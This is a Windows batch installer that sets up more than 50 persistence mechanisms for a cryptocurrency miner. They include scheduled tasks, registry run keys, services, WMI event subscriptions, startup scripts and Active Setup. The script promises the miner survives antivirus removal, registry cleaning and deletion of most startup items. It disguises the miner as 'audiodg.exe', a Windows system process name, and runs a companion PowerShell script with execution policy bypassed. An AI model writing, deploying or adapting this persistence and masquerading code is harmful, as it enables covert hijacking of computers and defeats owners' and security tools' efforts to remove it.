@echo off
REM ================================================================================================
REM STARTUP GUARANTEE INSTALLER
REM ================================================================================================
REM Installs 50+ startup mechanisms to ensure miner ALWAYS starts on boot
REM ================================================================================================

title Enhanced Startup Guarantee Installer
color 0A

echo.
echo +==============================================================+
echo |                                                              |
echo |        [START] ENHANCED STARTUP GUARANTEE INSTALLER [START]            |
echo |                                                              |
echo +==============================================================+
echo.
echo This will install 50+ startup mechanisms to ensure the miner
echo ALWAYS starts on every boot, login, and restart.
echo.
echo STARTUP METHODS:
echo   [OK] 60+ Scheduled Tasks (startup + logon + interval)
echo   [OK] 20+ Registry Run Keys (10 locations)
echo   [OK] 10 Windows Services (auto-start + restart on failure)
echo   [OK] 8 Startup Folder Scripts (VBS + BAT)
echo   [OK] 3 WMI Event Subscriptions
echo   [OK] Shell Folder Hooks
echo   [OK] Boot Execution
echo   [OK] Active Setup (runs on every login)
echo   [OK] Logon Scripts (GPO-style)
echo.
echo GUARANTEE: Miner will start even if:
echo   - User deletes 90%% of startup items
echo   - Antivirus removes some entries
echo   - Services are disabled
echo   - Registry is cleaned
echo.

REM Check admin
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo.
    echo [X] ERROR: Administrator rights required!
    echo    Right-click this file and select "Run as administrator"
    echo.
    pause
    exit /b 1
)

echo.
set /p confirm="Install startup guarantee? (YES/NO): "

if /i not "%confirm%"=="YES" (
    echo.
    echo Installation cancelled.
    pause
    exit /b
)

cls
echo.
echo +==============================================================+
echo |         INSTALLING ENHANCED STARTUP GUARANTEE...             |
echo +==============================================================+
echo.

REM Run PowerShell installer
powershell.exe -ExecutionPolicy Bypass -NoProfile -File "%~dp0🚀_ENHANCED_STARTUP_GUARANTEE.ps1"

if %errorLevel% equ 0 (
    echo.
    echo +==============================================================+
    echo |              [OK] INSTALLATION COMPLETE                        |
    echo +==============================================================+
    echo.
    echo Enhanced startup guarantee has been installed!
    echo.
    echo The miner will now start:
    echo   - On EVERY system boot (before login)
    echo   - On EVERY user login (any user)
    echo   - Every 30 minutes (backup check)
    echo   - After any service failure (auto-restart)
    echo.
    echo NEXT STEPS:
    echo   1. Restart your PC to test
    echo   2. Check Task Manager after restart
    echo   3. Verify "audiodg.exe" is running
    echo.
    echo You're all set! [START]
    echo.
) else (
    echo.
    echo +==============================================================+
    echo |              [!]  INSTALLATION HAD ISSUES                    |
    echo +==============================================================+
    echo.
    echo Some mechanisms may not have been installed.
    echo Check the log above for details.
    echo.
)

pause
